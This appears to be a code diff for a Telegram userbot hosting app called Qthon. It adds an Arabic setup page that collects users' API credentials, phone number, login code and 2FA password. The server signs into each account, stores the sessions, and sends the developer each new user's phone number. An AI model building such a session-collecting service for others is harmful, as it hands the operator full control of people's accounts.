+
+  /* ── step label ── */
+  .step-label {
+    display:flex; align-items:center; gap:10px;
+    margin-bottom:22px;
+  }
+  .step-dot {
+    width:28px; height:28px; border-radius:50%;
+    background: linear-gradient(135deg, var(--accent), var(--accent2));
+    display:flex; align-items:center; justify-content:center;
+    font-size:12px; font-weight:700; color:#fff;
+    box-shadow: 0 4px 12px var(--glow);
+    flex-shrink:0;
+  }
+  .step-text { font-size:14px; font-weight:600; color:var(--text2); }
+
+  /* ── back btn (top-left in RTL = start of flow, top-right visually) ── */
+  .back-btn {
+    display:inline-flex; align-items:center; gap:6px;
+    padding:6px 14px;
+    background: rgba(255,255,255,.05);
+    border: 1px solid var(--border);
+    border-radius:10px;
+    color: var(--text2);
+    font-size:12px; font-weight:600;
+    cursor:pointer;
+    transition: all .2s;
+    margin-bottom:18px;
+    -webkit-tap-highlight-color:transparent;
+    position:absolute;
+    top:24px; left:24px;
+  }
+  .back-btn:hover { background:rgba(255,255,255,.09); color:var(--text); }
+  .back-btn svg { width:14px; height:14px; fill:currentColor; }
+
+  /* ── field ── */
+  .field { margin-bottom:14px; }
+  .field label {
+    display:block;
+    font-size:11px; font-weight:700;
+    letter-spacing:1px; text-transform:uppercase;
+    color:var(--text3);
+    margin-bottom:7px;
+  }
+  .field input {
+    width:100%;
+    padding:14px 16px;
+    background: rgba(255,255,255,.04);
+    border: 1px solid var(--border);
+    border-radius:var(--r);
+    color:var(--text);
+    font-size:15px; font-weight:500;
+    font-family:inherit;
+    outline:none;
+    transition: border-color .2s, box-shadow .2s, background .2s;
+    caret-color: var(--accent);
+  }
+  .field input::placeholder { color:var(--text3); }
+  .field input:focus {
+    border-color: rgba(91,108,249,.6);
+    background: rgba(91,108,249,.05);
+    box-shadow: 0 0 0 3px rgba(91,108,249,.12);
+  }
+  #code {
+    text-align:center;
+    font-size:28px; font-weight:700;
+    letter-spacing:10px;
+  }
+
+  /* ── button ── */
+  .btn {
+    width:100%; padding:15px;
+    border:none; border-radius:var(--r);
+    font-size:15px; font-weight:700;
+    font-family:inherit;
+    cursor:pointer;
+    position:relative; overflow:hidden;
+    -webkit-tap-highlight-color:transparent;
+    transition: transform .15s, box-shadow .2s, background .2s;
+    margin-top:6px;
+  }
+  .btn:active { transform:scale(.97); }
+
+  .btn-blue {
+    background: linear-gradient(135deg, var(--accent) 0%, var(--accent2) 100%);
+    color:#fff;
+    box-shadow: 0 4px 20px var(--glow);
+  }
+  .btn-blue:hover { box-shadow:0 8px 32px rgba(91,108,249,.4); transform:translateY(-1px); }
+
+  .btn-green {
+    background: linear-gradient(135deg, #30D158 0%, #25A244 100%);
+    color:#fff;
+    box-shadow: 0 4px 20px rgba(48,209,88,.2);
+  }
+  .btn-green:hover { box-shadow:0 8px 32px rgba(48,209,88,.35); transform:translateY(-1px); }
+
+  /* ── button shimmer on press ── */
+  .btn::after {
+    content:'';
+    position:absolute; inset:0;
+    background: linear-gradient(90deg, transparent 0%, rgba(255,255,255,.18) 50%, transparent 100%);
+    transform: translateX(-100%);
+    transition: transform .4s ease;
+  }
+  .btn:active::after { transform:translateX(100%); }
+
+  /* ── progress bar inside button ── */
+  .btn .prog-bar {
+    position:absolute; bottom:0; left:0; height:3px;
+    background: rgba(255,255,255,.5);
+    border-radius:0 0 var(--r) var(--r);
+    width:0%; transition:width .05s linear;
+  }
+
+  .btn.loading {
+    pointer-events:none;
+    color:transparent;
+  }
+  .btn.loading::before {
+    content:'';
+    position:absolute; top:50%; left:50%;
+    width:20px; height:20px;
+    margin:-10px 0 0 -10px;
+    border:2.5px solid rgba(255,255,255,.3);
+    border-top-color:#fff;
+    border-radius:50%;
+    animation:spin .7s linear infinite;
+  }
+
+  /* ── result ── */
+  .result {
+    display:none; margin-top:16px;
+    padding:13px 16px;
+    border-radius:var(--r);
+    font-size:13px; font-weight:600;
+    text-align:center;
+    animation:fadeUp .35s ease;
+  }
+  .result.show { display:block; }
+  .result.ok  { background:rgba(48,209,88,.1);  border:1px solid rgba(48,209,88,.25);  color:var(--success); }
+  .result.err { background:rgba(255,69,58,.1);   border:1px solid rgba(255,69,58,.25);  color:var(--danger);  }
+
+  /* ── info card ── */
+  .info-card {
+    background:var(--card);
+    border:1px solid var(--border);
+    border-radius:var(--r2);
+    padding:20px 22px;
+    animation:fadeUp .5s .3s ease both;
+  }
+  .info-card h3 {
+    font-size:13px; font-weight:700;
+    color:var(--text2); margin-bottom:12px;
+    display:flex; align-items:center; gap:8px;
+  }
+  .info-card h3 span { font-size:16px; }
+  .info-card p {
+    font-size:13px; color:var(--text3);
+    line-height:1.75; margin-bottom:6px;
+  }
+  .info-card a {
+    color:var(--accent); text-decoration:none; font-weight:600;
+    border-bottom:1px solid transparent; transition:border-color .2s;
+  }
+  .info-card a:hover { border-bottom-color:var(--accent); }
+  .info-card .tg-btn {
+    display:flex; align-items:center; justify-content:center; gap:8px;
+    margin-top:14px;
+    padding:12px;
+    background: linear-gradient(135deg, rgba(91,108,249,.15), rgba(124,92,249,.1));
+    border:1px solid rgba(91,108,249,.25);
+    border-radius:14px;
+    color:var(--accent); font-size:13px; font-weight:700;
+    cursor:pointer; text-decoration:none;
+    transition:all .2s;
+    -webkit-tap-highlight-color:transparent;
+  }
+  .info-card .tg-btn:hover {
+    background:linear-gradient(135deg, rgba(91,108,249,.25), rgba(124,92,249,.18));
+    box-shadow:0 4px 20px rgba(91,108,249,.2);
+    transform:translateY(-1px);
+  }
+  .info-card .tg-btn svg { width:18px; height:18px; fill:currentColor; }
+
+  /* ── relative wrapper for back btn ── */
+  .rel { position:relative; padding-top:8px; }
+
+  /* ── hidden ── */
+  .hidden { display:none; }
+
+  /* ── keyframes ── */
+  @keyframes popIn {
+    from { opacity:0; transform:scale(.6); }
+    to   { opacity:1; transform:scale(1); }
+  }
+  @keyframes fadeUp {
+    from { opacity:0; transform:translateY(16px); }
+    to   { opacity:1; transform:translateY(0); }
+  }
+  @keyframes spin { to { transform:rotate(360deg); } }
+
+  @media (max-width:360px) {
+    .card { padding:22px 18px; }
+    .hd h1 { font-size:28px; }
+    #code { font-size:24px; letter-spacing:8px; }
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <!-- header -->
+  <div class="hd">
+    <div class="hd-icon">
+      <svg viewBox="0 0 24 24"><path d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
+    </div>
+    <h1>Qthon</h1>
+    <p>Telethon UserBot — Setup</p>
+  </div>
+
+  <!-- main card -->
+  <div class="card">
+
+    <!-- STEP 1 -->
+    <div id="step1">
+      <div class="step-label">
+        <div class="step-dot">1</div>
+        <span class="step-text">معلومات الحساب</span>
+      </div>
+
+      <div class="field">
+        <label>API ID</label>
+        <input id="api_id" type="text" placeholder="12345678" inputmode="numeric" autocomplete="off">
+      </div>
+      <div class="field">
+        <label>API Hash</label>
+        <input id="api_hash" type="text" placeholder="0123456789abcdef…" autocomplete="off">
+      </div>
+      <div class="field">
+        <label>رقم الهاتف</label>
+        <input id="phone" type="text" placeholder="+201234567890" inputmode="tel" autocomplete="off">
+      </div>
+
+      <button class="btn btn-blue" id="sendBtn" onclick="sendCode()">
+        <span class="btn-label">إرسال رمز التحقق</span>
+        <div class="prog-bar" id="prog1"></div>
+      </button>
+    </div>
+
+    <!-- STEP 2 -->
+    <div id="step2" class="hidden rel">
+      <button class="back-btn" onclick="backToStep1()">
+        <svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+        رجوع
+      </button>
+
+      <div class="step-label" style="margin-top:40px">
+        <div class="step-dot">2</div>
+        <span class="step-text">رمز التحقق</span>
+      </div>
+
+      <div class="field">
+        <label>الرمز المُرسل</label>
+        <input id="code" type="text" placeholder="12345" maxlength="5" inputmode="numeric" autocomplete="one-time-code">
+      </div>
+      <div class="field">
+        <label>كلمة مرور 2FA <span style="color:var(--text3);font-weight:400">(اختياري)</span></label>
+        <input id="password" type="password" placeholder="••••••••" autocomplete="current-password">
+      </div>
+
+      <button class="btn btn-green" id="verifyBtn" onclick="verify()">
+        <span class="btn-label">تفعيل Qthon</span>
+        <div class="prog-bar" id="prog2"></div>
+      </button>
+    </div>
+
+    <!-- result -->
+    <div class="result" id="result"></div>
+  </div>
+
+  <!-- info card -->
+  <div class="info-card">
+    <h3><span>🔑</span> كيف تحصل على بيانات الحساب؟</h3>
+    <p>① افتح موقع تيليجرام من الزر أدناه</p>
+    <p>② سجّل دخولك برقم هاتفك</p>
+    <p>③ اختر <strong style="color:var(--text2)">API development tools</strong></p>
+    <p>④ أنشئ تطبيقاً واحفظ الـ <strong style="color:var(--text2)">api_id</strong> والـ <strong style="color:var(--text2)">api_hash</strong></p>
+    <a class="tg-btn" href="https://my.telegram.org/apps" target="_blank">
+      <svg viewBox="0 0 24 24"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.447 1.394c-.16.16-.295.295-.605.295l.213-3.053 5.56-5.023c.242-.213-.054-.333-.373-.12l-6.871 4.326-2.962-.924c-.643-.204-.657-.643.136-.953l11.57-4.461c.537-.194 1.006.131.833.941z"/></svg>
+      فتح my.telegram.org
+    </a>
+  </div>
+
+</div>
+
+<script>
+const $ = id => document.getElementById(id);
+
+let currentPhone = '';
+
+function showResult(msg, ok) {
+  const r = $('result');
+  r.className = 'result show ' + (ok ? 'ok' : 'err');
+  r.textContent = msg;
+}
+
+function runProgress(barId, duration, onDone) {
+  const bar = $(barId);
+  let w = 0;
+  const step = 100 / (duration / 50);
+  bar.style.width = '0%';
+  const iv = setInterval(() => {
+    w = Math.min(w + step + Math.random() * step * .5, 92);
+    bar.style.width = w + '%';
+    if (w >= 92) clearInterval(iv);
+  }, 50);
+  return { finish: () => {
+    clearInterval(iv);
+    bar.style.transition = 'width .3s ease';
+    bar.style.width = '100%';
+    setTimeout(() => { bar.style.width = '0%'; bar.style.transition = 'width .05s linear'; if(onDone) onDone(); }, 350);
+  }};
+}
+
+async function sendCode() {
+  const api_id = $('api_id').value.trim();
+  const api_hash = $('api_hash').value.trim();
+  const phone = $('phone').value.trim();
+  if (!api_id || !api_hash || !phone) { showResult('يرجى تعبئة جميع الحقول', false); return; }
+
+  const btn = $('sendBtn');
+  btn.classList.add('loading');
+  const prog = runProgress('prog1', 4000);
+
+  try {
+    const fd = new FormData();
+    fd.append('api_id', api_id);
+    fd.append('api_hash', api_hash);
+    fd.append('phone', phone);
+    const res = await fetch('/api/send_code', { method:'POST', body:fd });
+    const data = await res.json();
+    prog.finish();
+    if (data.status === 'code_sent' || data.status === 'already_active') {
+      currentPhone = phone;
+      if (data.status === 'code_sent') {
+        $('step1').classList.add('hidden');
+        $('step2').classList.remove('hidden');
+        showResult('✓ تم إرسال رمز التحقق', true);
+      } else {
+        showResult('✓ الجلسة نشطة بالفعل', true);
+      }
+    } else {
+      showResult(data.message || 'حدث خطأ', false);
+    }
+  } catch(e) {
+    prog.finish();
+    showResult('خطأ في الاتصال', false);
+  } finally {
+    btn.classList.remove('loading');
+  }
+}
+
+async function verify() {
+  const code = $('code').value.trim();
+  const password = $('password').value;
+  if (!code) { showResult('أدخل رمز التحقق', false); return; }
+
+  const btn = $('verifyBtn');
+  btn.classList.add('loading');
+  const prog = runProgress('prog2', 5000);
+
+  try {
+    const fd = new FormData();
+    fd.append('phone', currentPhone);
+    fd.append('code', code);
+    fd.append('password', password);
+    const res = await fetch('/api/verify', { method:'POST', body:fd });
+    const data = await res.json();
+    prog.finish();
+    if (data.status === 'success') {
+      showResult('✓ تم تثبيت تيليثون كيوثون بنجاح!', true);
+    } else {
+      showResult(data.message || 'فشل التحقق', false);
+    }
+  } catch(e) {
+    prog.finish();
+    showResult('خطأ في الاتصال', false);
+  } finally {
+    btn.classList.remove('loading');
+  }
+}
+
+function backToStep1() {
+  $('step2').classList.add('hidden');
+  $('step1').classList.remove('hidden');
+  $('result').className = 'result';
+}
+
+// Enter key support
+document.addEventListener('keydown', e => {
+  if (e.key !== 'Enter') return;
+  if (!$('step2').classList.contains('hidden')) verify();
+  else if (!$('step1').classList.contains('hidden')) sendCode();
+});
+</script>
+</body>
+</html>"""
 
 @app.route('/health')
 def health():
@@ -1009,7 +1063,7 @@ async def send_code():
         api_hash = request.form.get('api_hash')
         phone = request.form.get('phone', '').strip()
         if not api_id or not api_hash or not phone:
-            return jsonify({"status": "error", "message": "All fields required"}), 400
+            return jsonify({"status": "error", "message": "جميع الحقول مطلوبة"}), 400
         api_configs_storage[phone] = {'api_id': api_id, 'api_hash': api_hash}
         client = TelegramClient(StringSession(), api_id, api_hash)
         await client.connect()
@@ -1018,10 +1072,10 @@ async def send_code():
             client_me[phone] = await client.get_me()
             start_client_in_background(client, phone)
             await save_all_sessions()
-            return jsonify({"status": "already_active", "message": "UserBot is already active"})
+            return jsonify({"status": "already_active", "message": "الجلسة نشطة بالفعل"})
         sent = await client.send_code_request(phone)
         pending_logins[phone] = (client, sent.phone_code_hash, api_id, api_hash)
-        return jsonify({"status": "code_sent", "message": "Verification code sent"})
+        return jsonify({"status": "code_sent", "message": "تم إرسال رمز التحقق"})
     except Exception as e:
         logger.error(f"Send code error: {e}")
         return jsonify({"status": "error", "message": str(e)}), 500
@@ -1033,23 +1087,22 @@ async def verify():
     code = request.form.get('code', '').strip()
     password = request.form.get('password')
     if not phone or not code or phone not in pending_logins:
-        return jsonify({"status": "error", "message": "Invalid session"}), 400
+        return jsonify({"status": "error", "message": "جلسة غير صالحة"}), 400
     client, phone_code_hash, api_id, api_hash = pending_logins[phone]
     try:
         try:
             await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
         except SessionPasswordNeededError:
             if not password:
-                return jsonify({"status": "error", "message": "2FA password required"}), 401
+                return jsonify({"status": "error", "message": "كلمة مرور 2FA مطلوبة"}), 401
             await client.sign_in(password=password)
         active_clients[phone] = client
         client_me[phone] = await client.get_me()
         del pending_logins[phone]
         await save_all_sessions()
         start_client_in_background(client, phone)
-        # إشعار المطور بمستخدم جديد
-        await notify_dev(f"New user activated: {phone}")
-        return jsonify({"status": "success", "message": "Telethon Qthon installed successfully"})
+        await notify_dev(f"✅ مستخدم جديد فعّل البوت\n📱 {phone}")
+        return jsonify({"status": "success", "message": "تم تثبيت تيليثون كيوثون بنجاح"})
     except Exception as e:
         logger.error(f"Verify error: {e}")
         return jsonify({"status": "error", "message": str(e)}), 400
@@ -1066,8 +1119,7 @@ loop_thread.start()
 async def main():
     await bot.start(bot_token=BOT_TOKEN)
     logger.info("Bot started")
-    # إشعار المطور بأن البوت قيد التشغيل
-    await notify_dev("Bot is now running and ready.")
+    await notify_dev("🚀 Qthon Bot started successfully!")
     await bot.run_until_disconnected()
 
 if __name__ == '__main__':
